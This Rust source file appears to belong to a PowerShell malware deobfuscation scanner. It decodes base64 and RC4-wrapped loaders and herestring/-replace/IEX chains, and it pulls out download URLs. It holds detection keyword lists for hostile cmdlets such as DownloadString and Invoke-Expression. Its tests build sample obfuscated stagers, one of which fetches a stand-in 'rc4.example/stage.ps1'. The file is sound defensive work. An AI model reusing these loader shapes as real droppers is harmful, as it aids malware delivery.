fn looks_like_powershell_payload(bytes: &[u8]) -> bool {
    let text = decode_payload(bytes);
    contains_ascii_case_insensitive(&text, "invoke-")
        || contains_ascii_case_insensitive(&text, "new-object")
        || contains_ascii_case_insensitive(&text, "downloadstring")
        || contains_ascii_case_insensitive(&text, "downloadfile")
        || contains_ascii_case_insensitive(&text, "start-process")
        || contains_ascii_case_insensitive(&text, "powershell")
        || contains_ascii_case_insensitive(&text, "frombase64string")
        || contains_ascii_case_insensitive(&text, "iex ")
        || contains_ascii_case_insensitive(&text, "http://")
        || contains_ascii_case_insensitive(&text, "https://")
}

fn is_utf16le(bytes: &[u8]) -> bool {
    if bytes.len() < 4 {
        return false;
    }
    // Check BOM first
    if bytes[0] == 0xFF && bytes[1] == 0xFE {
        return true;
    }
    // Heuristic: odd-offset bytes are mostly zero (ASCII codepoints in UTF-16LE)
    let sample = &bytes[..bytes.len().min(256)];
    let pairs = sample.len() / 2;
    if pairs == 0 {
        return false;
    }
    let odd_zeros = sample.chunks_exact(2).filter(|b| b[1] == 0).count();
    odd_zeros * 2 >= pairs // >= 50% of odd bytes are zero
}

fn dynamic_download_invoke_urls(text: &str) -> Vec<String> {
    let mut foreach_urls: std::collections::HashMap<String, Vec<String>> =
        std::collections::HashMap::new();
    let mut array_bindings: std::collections::HashMap<String, Vec<String>> =
        std::collections::HashMap::new();

    for caps in PS_ARRAY_LITERAL_ASSIGN_RE.captures_iter(text) {
        let Some(var) = caps.get(1) else {
            continue;
        };
        let Some(body) = caps.get(2) else {
            continue;
        };
        let urls = ps_literal_urls(body.as_str());
        if !urls.is_empty() {
            array_bindings.insert(var.as_str().to_ascii_lowercase(), urls);
        }
    }

    for caps in FOREACH_LITERAL_ARRAY_RE.captures_iter(text) {
        let Some(var) = caps.get(1) else {
            continue;
        };
        let Some(body) = caps.get(2) else {
            continue;
        };
        let urls = ps_literal_urls(body.as_str());
        if !urls.is_empty() {
            foreach_urls.insert(var.as_str().to_ascii_lowercase(), urls);
        }
    }

    for caps in FOREACH_ARRAY_VAR_RE.captures_iter(text) {
        let (Some(item_var), Some(array_var)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let Some(urls) = array_bindings.get(&array_var.as_str().to_ascii_lowercase()) else {
            continue;
        };
        foreach_urls.insert(item_var.as_str().to_ascii_lowercase(), urls.clone());
    }

    let mut seen = std::collections::HashSet::new();
    let mut urls = Vec::new();
    for caps in DYNAMIC_DOWNLOAD_INVOKE_RE.captures_iter(text) {
        if let Some(literal) = caps.get(2) {
            let Some(url) = crate::deob_scan::normalize_liberal_url_token(literal.as_str()) else {
                continue;
            };
            if seen.insert(url.clone()) {
                urls.push(url);
            }
            continue;
        }

        let Some(var) = caps.get(1) else {
            continue;
        };
        if let Some(values) = foreach_urls.get(&var.as_str().to_ascii_lowercase()) {
            for url in values {
                if seen.insert(url.clone()) {
                    urls.push(url.clone());
                }
            }
        }
    }
    urls
}

fn ps_literal_urls(text: &str) -> Vec<String> {
    PS_QUOTED_LITERAL_RE
        .captures_iter(text)
        .filter_map(|literal_caps| {
            literal_caps
                .get(1)
                .or_else(|| literal_caps.get(2))
                .map(|m| m.as_str().to_string())
        })
        .filter(|value| looks_like_liberal_url(value))
        .filter_map(|value| crate::deob_scan::normalize_liberal_url_token(&value))
        .collect()
}

fn ps_literal_urls_in_download_context(text: &str) -> Vec<String> {
    if !contains_ascii_case_insensitive(text, "download")
        && !contains_ascii_case_insensitive(text, "invoke-webrequest")
        && !contains_ascii_case_insensitive(text, "invoke-restmethod")
    {
        return Vec::new();
    }
    let mut seen = std::collections::HashSet::new();
    PS_QUOTED_LITERAL_RE
        .captures_iter(text)
        .filter_map(|literal_caps| {
            literal_caps
                .get(1)
                .or_else(|| literal_caps.get(2))
                .map(|m| (m.start(), m.as_str().to_string()))
        })
        .filter(|(start, value)| {
            looks_like_liberal_url(value)
                && !ps_url_inside_non_download_hash_option(text, *start)
                && !ps_url_is_non_download_option_value(text, *start)
                && seen.insert(value.clone())
        })
        .filter_map(|(_, value)| crate::deob_scan::normalize_liberal_url_token(&value))
        .collect()
}

/// Run all URL-extraction patterns over each ps1 payload. Emit a Download
/// trait for each unique (url, payload_idx) pair found.
// Matches `[Convert]::FromBase64String('...')` or `[System.Convert]::FromBase64String('...')`
// at the top level of a PS payload. Captures: 1=base64 string.
#[allow(clippy::expect_used)]
static OUTER_FROMBASE64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*'([A-Za-z0-9+/=]{32,})'\s*\)"#,
    )
    .expect("outer frombase64 literal")
});

#[cfg(test)]
mod herestring_iex_tests {
    use super::*;
    #[test]
    fn extracts_clean_herestring_replace_iex() {
        let text = "$myvar=@'\nthis is INNERSTRIP body\n'@\n$other=$myvar -replace 'INNERSTRIP',''\niex $other\n";
        let bodies = extract_herestring_replace_iex_from_text(text);
        assert_eq!(bodies.len(), 1, "got {:?}", bodies);
        assert_eq!(bodies[0], "this is  body");
    }
    #[test]
    fn extracts_doubled_quote_herestring() {
        // Same chain wrapped in outer single-quote literal: internal quotes
        // doubled, IEX written as `&('Invoke-Expression')$var`.
        let text = "$myvar=@''\nthis is INNERSTRIP body\n''@\n$other=$myvar -replace ''INNERSTRIP'',''''\n&('Invoke-Expression')$other\n";
        let bodies = extract_herestring_replace_iex_from_text(text);
        assert_eq!(bodies.len(), 1, "got {:?}", bodies);
        assert_eq!(bodies[0], "this is  body");
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod rc4_tests {
    use super::{decode_rc4_wrapper_from_text, rc4_crypt};
    use base64::Engine;

    fn rc4_encrypt(plain: &[u8], key: &[u8]) -> Vec<u8> {
        let mut s = [0u8; 256];
        for (i, slot) in s.iter_mut().enumerate() {
            *slot = i as u8;
        }
        let mut j = 0u8;
        for i in 0..256usize {
            j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
            s.swap(i, j as usize);
        }
        let mut i = 0u8;
        let mut j = 0u8;
        let mut out = Vec::with_capacity(plain.len());
        for &b in plain {
            i = i.wrapping_add(1);
            j = j.wrapping_add(s[i as usize]);
            s.swap(i as usize, j as usize);
            let k = s[(s[i as usize].wrapping_add(s[j as usize])) as usize];
            out.push(b ^ k);
        }
        out
    }

    #[test]
    fn rc4_known_vector_decrypts_plaintext() {
        let cipher = match base64::engine::general_purpose::STANDARD.decode("u/MW6NlArwrT") {
            Ok(bytes) => bytes,
            Err(err) => panic!("base64: {err}"),
        };
        let plain = rc4_crypt(&cipher, b"Key");
        assert_eq!(String::from_utf8_lossy(&plain), "Plaintext");
    }

    #[test]
    fn rc4_wrapper_shape_is_decoded() {
        let plaintext = "Invoke-WebRequest https://rc4.example/stage.ps1";
        let key = b"Key";
        let enc_b64 = base64::engine::general_purpose::STANDARD
            .encode(rc4_encrypt(plaintext.as_bytes(), key));
        let wrapper = r#"
$rc4EncData = '{enc_b64}'
$rc4KeyB64 = 'S2V5'
$rc4Decrypt = { param([byte[]]$cipherData,[byte[]]$decryptKey) $cipherData -bxor $decryptKey }
iex ([Text.Encoding]::UTF8.GetString(((& $rc4Decrypt ([Convert]::FromBase64String($rc4EncData)) ([Convert]::FromBase64String($rc4KeyB64)))))
"#;
        let Some(decoded) = decode_rc4_wrapper_from_text(&wrapper.replace("{enc_b64}", &enc_b64))
        else {
            panic!("rc4 wrapper");
        };
        assert_eq!(
            String::from_utf8_lossy(&decoded),
            "Invoke-WebRequest https://rc4.example/stage.ps1"
        );
    }
}

#[cfg(test)]
mod passthrough_prefilter_tests {
    use super::contains_potential_passthrough_call_wrapper;

    #[test]
    fn detects_quoted_passthrough_wrapper_shape() {
        let text = "function x { &('Invoke-Expression') ($y) }";
        assert!(contains_potential_passthrough_call_wrapper(text));
    }

    #[test]
    fn ignores_ampersand_calls_without_quoted_target() {
        let text = "function x { &($target) ($y) }";
        assert!(!contains_potential_passthrough_call_wrapper(text));
    }

    #[test]
    fn trailing_ampersand_sequence_does_not_panic() {
        let text = "invoke-expression &>&&>&>&&>&&&";
        assert!(!contains_potential_passthrough_call_wrapper(text));
    }
}

/// Walk every entry in `env.all_extracted_ps1` looking for a one-shot
/// herestring + `-replace` + IEX chain (sometimes wrapped in one round of
/// `[Convert]::FromBase64String('...')`). When found, push the decoded inner
/// PS body to `env.all_extracted_ps1` so the main scan picks it up.
fn extract_herestring_replace_iex_inners(env: &mut Environment) {
    let payloads = env.all_extracted_ps1.clone();
    let mut new_payloads: Vec<Vec<u8>> = Vec::new();
    let mut seen: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    for payload in payloads {
        let text = String::from_utf8_lossy(&payload).into_owned();
        // Candidate texts: the raw payload, plus one round of base64 decoding
        // for `[Convert]::FromBase64String('...')` wrappers.
        let mut candidates: Vec<String> = vec![text.clone()];
        for caps in OUTER_FROMBASE64_LITERAL_RE.captures_iter(&text) {
            let Some(b64) = caps.get(1) else { continue };
            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64.as_str()) else {
                continue;
            };
            if decoded.len() > 4 * 1024 * 1024 {
                continue;
            }
            let s = decode_payload(&decoded).into_owned();
            candidates.push(s);
        }
        for cand in candidates {
            let bodies = extract_herestring_replace_iex_from_text(&cand);
            for body in bodies {
                let bytes = body.into_bytes();
                if seen.insert(bytes.clone()) {
                    new_payloads.push(bytes);
                }
            }
        }
    }
    env.all_extracted_ps1.extend(new_payloads);
}

/// Walk every entry in `env.all_extracted_ps1` looking for a PowerShell RC4
/// loader that carries one base64 ciphertext variable and one base64 key
/// variable. When found, decrypt the payload and push the decoded inner script
/// so the main scan can recurse into it.
fn extract_rc4_wrapper_inners(env: &mut Environment) {
    let payloads = env.all_extracted_ps1.clone();
    let mut new_payloads: Vec<Vec<u8>> = Vec::new();
    let mut seen: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();

    for payload in payloads {
        let text = decode_payload(&payload).into_owned();
        let mut candidates: Vec<String> = vec![text.clone()];
        for caps in OUTER_FROMBASE64_LITERAL_RE.captures_iter(&text) {
            let Some(b64) = caps.get(1) else { continue };
            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64.as_str()) else {
                continue;
            };
            if decoded.len() > 4 * 1024 * 1024 {
                continue;
            }
            candidates.push(decode_payload(&decoded).into_owned());
        }

        for cand in candidates {
            let Some(decoded) = decode_rc4_wrapper_from_text(&cand) else {
                continue;
            };
            if seen.insert(decoded.clone()) {
                new_payloads.push(decoded);
            }
        }
    }

    env.all_extracted_ps1.extend(new_payloads);
}

fn decode_rc4_wrapper_from_text(text: &str) -> Option<Vec<u8>> {
    let lower = text.to_ascii_lowercase();
    if !lower.contains("frombase64string")
        || !lower.contains("-bxor")
        || !(lower.contains("iex")
            || lower.contains("invoke-expression")
            || lower.contains("finalscript"))
    {
        return None;
    }

    let bindings = ps_string_bindings(text);
    if bindings.len() < 2 {
        return None;
    }

    let mut key_b64: Option<&str> = None;
    let mut data_b64: Option<&str> = None;
    for (name, value) in &bindings {
        let lower_name = name.to_ascii_lowercase();
        if lower_name.contains("key")
            && key_b64
                .map(|current| value.len() > current.len())
                .unwrap_or(true)
        {
            key_b64 = Some(value.as_str());
        }
        if (lower_name.contains("enc")
            || lower_name.contains("data")
            || lower_name.contains("cipher"))
            && data_b64
                .map(|current| value.len() > current.len())
                .unwrap_or(true)
        {
            data_b64 = Some(value.as_str());
        }
    }

    let data_b64 = data_b64?;
    let key_b64 = key_b64?;
    let cipher = base64::engine::general_purpose::STANDARD
        .decode(data_b64)
        .ok()?;
    let key = base64::engine::general_purpose::STANDARD
        .decode(key_b64)
        .ok()?;
    if cipher.is_empty() || key.is_empty() {
        return None;
    }
    let decoded = rc4_crypt(&cipher, &key);
    let decoded_text = decode_payload(&decoded).into_owned();
    let decoded_lower = decoded_text.to_ascii_lowercase();
    if !(decoded_lower.contains("http://")
        || decoded_lower.contains("https://")
        || decoded_lower.contains("invoke-")
        || decoded_lower.contains("assembly::load")
        || decoded_lower.contains("frombase64string")
        || decoded_lower.contains("new-object"))
    {
        return None;
    }
    Some(decoded_text.into_bytes())
}

fn rc4_crypt(cipher: &[u8], key: &[u8]) -> Vec<u8> {
    if key.is_empty() {
        return Vec::new();
    }
    let mut s = [0u8; 256];
    for (i, slot) in s.iter_mut().enumerate() {
        *slot = i as u8;
    }

    let mut j = 0u8;
    for i in 0..256usize {
        j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
        s.swap(i, j as usize);
    }

    let mut out = Vec::with_capacity(cipher.len());
    let mut i = 0u8;
    let mut j = 0u8;
    for &byte in cipher {
        i = i.wrapping_add(1);
        j = j.wrapping_add(s[i as usize]);
        s.swap(i as usize, j as usize);
        let t = s[i as usize].wrapping_add(s[j as usize]);
        out.push(byte ^ s[t as usize]);
    }
    out
}

/// Find every `$VAR = @'...'@ ; $VAR2 = $VAR -replace 'X','Y' ; iex $VAR2`
/// chain in `text` and return the decoded inner bodies.
fn extract_herestring_replace_iex_from_text(text: &str) -> Vec<String> {
    use std::collections::HashMap;
    let mut here: HashMap<String, String> = HashMap::new();
    for caps in PS_HERESTRING_ASSIGN_RE.captures_iter(text) {
        let Some(name) = caps.get(1) else { continue };
        let Some(body) = caps.get(2) else { continue };
        here.insert(
            name.as_str().to_ascii_lowercase(),
            body.as_str().to_string(),
        );
    }
    if here.is_empty() {
        return Vec::new();
    }
    let mut out = Vec::new();
    for caps in PS_VAR_REPLACE_ASSIGN_RE.captures_iter(text) {
        let dest = match caps.get(1) {
            Some(m) => m.as_str().to_ascii_lowercase(),
            None => continue,
        };
        let src = match caps.get(2) {
            Some(m) => m.as_str().to_ascii_lowercase(),
            None => continue,
        };
        let Some(src_body) = here.get(&src) else {
            continue;
        };
        let needle = match caps.get(3) {
            Some(m) => m.as_str().replace("''", "'"),
            None => continue,
        };
        let repl = match caps.get(4) {
            Some(m) => m.as_str().replace("''", "'"),
            None => continue,
        };
        let src_body = src_body.replace("''", "'");
        let iex_pat = format!(
            r#"(?i)(?:iex\b|invoke-expression\b|&\s*\(\s*'invoke[-' ]*expression'\s*\)|&\s*\(\s*'invoke'\s*\+\s*'-expression'\s*\))\s*\$(?-i:{dest})\b"#,
            dest = regex::escape(&dest)
        );
        let Ok(iex_re) = regex::Regex::new(&iex_pat) else {
            continue;
        };
        if !iex_re.is_match(text) {
            continue;
        }
        let decoded = if needle.is_empty() {
            src_body
        } else {
            src_body.replace(needle.as_str(), repl.as_str())
        };
        if decoded.trim().is_empty() {
            continue;
        }
        out.push(decoded);
    }
    out
}

pub fn scan_ps1_payloads(env: &mut Environment) {
    // Pre-pass: extract herestring + -replace + IEX inner payloads from raw
    // PS bytes, decoding one round of outer `[Convert]::FromBase64String(...)`
    // first. Adds decoded inners to `all_extracted_ps1` so the main scan loop
    // sees them. Run on raw bytes (before strip_marker_noise) so the marker-
    // noise stripper doesn't eat the `-replace` target chars from inside the
    // herestring body.
    extract_herestring_replace_iex_inners(env);
    extract_rc4_wrapper_inners(env);

    // Use all_extracted_ps1 to cover every payload across the run, not just
    // the latest exec_ps1 (which gets drained).
    let payloads: Vec<Vec<u8>> = env.all_extracted_ps1.clone();
    let mut seen: std::collections::HashSet<(usize, String)> = std::collections::HashSet::new();

    for (idx, payload) in payloads.iter().enumerate() {
        let raw_text = decode_payload(payload);
        let raw_owned: String = raw_text.clone().into_owned();

        let text_expanded = expand_obfuscation(&raw_owned);
        // Dual-scan: also run URL regexes over alias-expanded version so that
        // `iwr`, `irm`, `wget` etc. are caught even if obfuscation expansion
        // didn't surface them.
        let text_aliased = crate::ps_alias::expand_aliases_if_ps(&text_expanded);
        let candidates: Vec<String> = if text_aliased != text_expanded {
            vec![text_expanded, text_aliased]
        } else {
            vec![text_expanded]
        };

        // Use the first candidate for OutFile / snippet display.
        let primary = &candidates[0];

        let snippet = snippet_prefix(primary, 120);

        let regexes: &[&Lazy<Regex>] = &[
            &IWR_RE,
            &IRM_RE,
            &PS_SCHEMELESS_IP_CMDLET_RE,
            &CURL_EXE_RE,
            &MSHTA_URL_RE,
            &DOWNLOADSTRING_RE,
            &BARE_DOWNLOADSTRING_RE,
            &DOWNLOADSTRING_FRAGMENT_RE,
            &CALLBYNAME_DOWNLOADSTRING_RE,
            &START_BITS_RE,
            &NET_REQ_RE,
            &PS_GENERIC_URL_RE,
        ];

        for text in &candidates {
            for re in regexes {
                for caps in re.captures_iter(text) {
                    let Some(url_match) = caps.get(1) else {
                        continue;
                    };
                    if ps_url_inside_non_download_hash_option(text, url_match.start()) {
                        continue;
                    }
                    if ps_url_is_non_download_option_value(text, url_match.start()) {
                        continue;
                    }
                    let mut url = clean_ps_url(url_match.as_str());
                    if is_schemeless_ip_url(&url) {
                        url = format!("http://{url}");
                    }
                    let Some(url) = crate::deob_scan::normalize_liberal_url_token(&url) else {
                        continue;
                    };
                    if !seen.insert((idx, url.clone())) {
                        continue;
                    }
                    let statement = caps
                        .get(0)
                        .map(|m| logical_statement_at(text, m.start()))
                        .unwrap_or(primary);
                    let dst_hint = outfile_hint_from(statement);
                    env.traits.push(Trait::Download {
                        cmd: format!("(ps1 #{idx}) {snippet}"),
                        src: url,
                        dst: dst_hint,
                    });
                }
            }

            for url in dynamic_download_invoke_urls(text) {
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                env.traits.push(Trait::Download {
                    cmd: format!("(ps1 #{idx}) {snippet}"),
                    src: url,
                    dst: outfile_hint_from(primary),
                });
            }

            for url in ps_literal_urls_in_download_context(text) {
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                env.traits.push(Trait::Download {
                    cmd: format!("(ps1 #{idx}) {snippet}"),
                    src: url,
                    dst: outfile_hint_from(primary),
                });
            }
        }
    }
}

fn ps_url_inside_non_download_hash_option(text: &str, url_start: usize) -> bool {
    let stmt_start = text[..url_start]
        .rfind(['\r', '\n', ';'])
        .map_or(0, |idx| idx + 1);
    let before_url = &text[stmt_start..url_start];
    let lower = before_url.to_ascii_lowercase();
    for option in ["-headers", "-body"] {
        let Some(option_pos) = rfind_ps_option_token(&lower, option) else {
            continue;
        };
        let after_option = &before_url[option_pos..];
        let Some(hash_rel) = after_option.rfind("@{") else {
            continue;
        };
        let hash_start = stmt_start + option_pos + hash_rel;
        if !text[hash_start..url_start].contains('}') {
            return true;
        }
    }
    false
}

fn rfind_ps_option_token(lower: &str, option: &str) -> Option<usize> {
    let mut search_end = lower.len();
    while let Some(pos) = lower[..search_end].rfind(option) {
        let before_boundary = pos == 0
            || lower.as_bytes()[pos - 1].is_ascii_whitespace()
            || matches!(lower.as_bytes()[pos - 1], b'(' | b';');
        let after = pos + option.len();
        let after_boundary = after == lower.len()
            || lower.as_bytes()[after].is_ascii_whitespace()
            || matches!(lower.as_bytes()[after], b':' | b'=');
        if before_boundary && after_boundary {
            return Some(pos);
        }
        search_end = pos;
    }
    None
}

fn ps_url_is_non_download_option_value(text: &str, url_start: usize) -> bool {
    let stmt_start = text[..url_start]
        .rfind(['\r', '\n', ';'])
        .map_or(0, |idx| idx + 1);
    let before_url = &text[stmt_start..url_start];
    ps_non_download_option_before_value(
        before_url.trim_end_matches([' ', '\t', '\r', '\n', '"', '\'', '(', '=', ':']),
    ) || ps_quoted_non_download_option_before_value(before_url)
}

fn ps_quoted_non_download_option_before_value(before_url: &str) -> bool {
    let Some((quote_pos, _)) = before_url
        .char_indices()
        .rev()
        .find(|(_, ch)| *ch == '"' || *ch == '\'')
    else {
        return false;
    };
    ps_non_download_option_before_value(before_url[..quote_pos].trim_end())
}

fn ps_non_download_option_before_value(before_value: &str) -> bool {
    let Some(option) = before_value.split_whitespace().last() else {
        return false;
    };
    let option = option.trim_end_matches(['=', ':']);
    option.eq_ignore_ascii_case("-body")
        || option.eq_ignore_ascii_case("-proxy")
        || option.eq_ignore_ascii_case("-useragent")
}

fn clean_ps_url(raw: &str) -> String {
    let mut url = raw.trim().trim_matches(['"', '\'']).to_string();
    for marker in ['[', '{'] {
        if let Some(pos) = url.find(marker) {
            url.truncate(pos);
        }
    }
    url.truncate(
        url.trim_end_matches(['.', ',', ';', ':', ')', ']', '}', '"', '\'', '`'])
            .len(),
    );
    url
}

fn is_schemeless_ip_url(url: &str) -> bool {
    let Some(host) = url.split([':', '/']).next() else {
        return false;
    };
    let mut parts = host.split('.');
    let octets = [
        parts.next(),
        parts.next(),
        parts.next(),
        parts.next(),
        parts.next(),
    ];
    if octets[4].is_some() {
        return false;
    }
    octets[..4]
        .iter()
        .all(|part| part.and_then(|p| p.parse::<u8>().ok()).is_some())
}

pub fn scan_inline_powershell_text(text: &str, env: &mut Environment) {
    let lower = text.to_ascii_lowercase();
    if !lower.contains("powershell")
        && !lower.contains("downloadstring")
        && !lower.contains("downloadfile")
        && !lower.contains("downloaddata")
        && !lower.contains("callbyname")
        && !lower.contains("invoke-expression")
        && !lower.contains("iex")
        && !lower.contains("-bxor")
        && !lower.contains("gzipstream")
    {
        return;
    }
    let known_downloads: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();
    let mut payload_env = Environment::new(&crate::env::Config {
        max_depth: env.limits.max_depth,
        max_iterations: env.limits.max_iterations,
        max_child_scripts: env.limits.max_child_scripts,
        timeout_secs: 0,
        self_extract: false,
        winver: env.winver,
        max_output_bytes: env.limits.max_output_bytes,
        max_output_line_bytes: env.limits.max_output_line_bytes,
        max_traits_per_kind: 100,
    });
    payload_env.all_extracted_ps1.push(text.as_bytes().to_vec());
    scan_ps1_payloads(&mut payload_env);
    env.traits
        .extend(payload_env.traits.into_iter().filter(|t| match t {
            Trait::Download { src, .. } => !known_downloads.contains(src),
            _ => true,
        }));
}
